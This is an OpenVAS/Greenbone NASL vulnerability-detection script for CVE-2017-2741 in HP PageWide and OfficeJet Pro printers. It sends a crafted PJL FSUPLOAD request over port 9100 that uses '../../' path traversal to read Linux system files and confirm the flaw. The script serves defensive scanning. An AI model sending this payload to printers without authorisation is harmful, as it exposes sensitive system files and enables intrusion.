if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106920" );
	script_version( "2021-09-10T11:01:38+0000" );
	script_tag( name: "last_modification", value: "2021-09-10 11:01:38 +0000 (Fri, 10 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-07-05 09:03:32 +0700 (Wed, 05 Jul 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_cve_id( "CVE-2017-2741" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "HP Printers Arbitrary Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Remote file access" );
	script_dependencies( "gb_pcl_pjl_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/hp-pjl", 9100 );
	script_require_keys( "Host/runs_unixoide" );
	script_tag( name: "summary", value: "A potential security vulnerability has been identified with certain HP
  printers. This vulnerability could potentially be exploited to execute arbitrary code." );
	script_tag( name: "vuldetect", value: "Sends a crafted PJL request and checks the response." );
	script_tag( name: "affected", value: "HP PageWide Printers and HP OfficeJet Pro Printers." );
	script_tag( name: "solution", value: "HP has provided firmware updates for impacted printers. See the
  referenced advisory for further details." );
	script_xref( name: "URL", value: "https://support.hp.com/lt-en/document/c05462914" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("string_hex_func.inc.sc");
require("port_service_func.inc.sc");
port = get_kb_item( "Services/hp-pjl" );
if(!port){
	port = 9100;
	not_in_kb = TRUE;
}
if(!get_port_state( port )){
	exit( 0 );
}
files = traversal_files( "linux" );
if(hexstr( unknown_banner_get( port: port, dontfetch: TRUE ) ) == "aeaeaeaeae" || not_in_kb){
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	for pattern in keys( files ) {
		file = files[pattern];
		send( socket: soc, data: "\x1b%-12345X@PJL FSUPLOAD NAME=\"../../" + file + "\" OFFSET=0 SIZE=648\r\n\x1b%-12345X\r\n" );
		res = recv( socket: soc, length: 1024 );
		close( soc );
		if(egrep( string: res, pattern: pattern )){
			report = "It was possible to obtain the /" + file + " file.\\n\\n" + res;
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

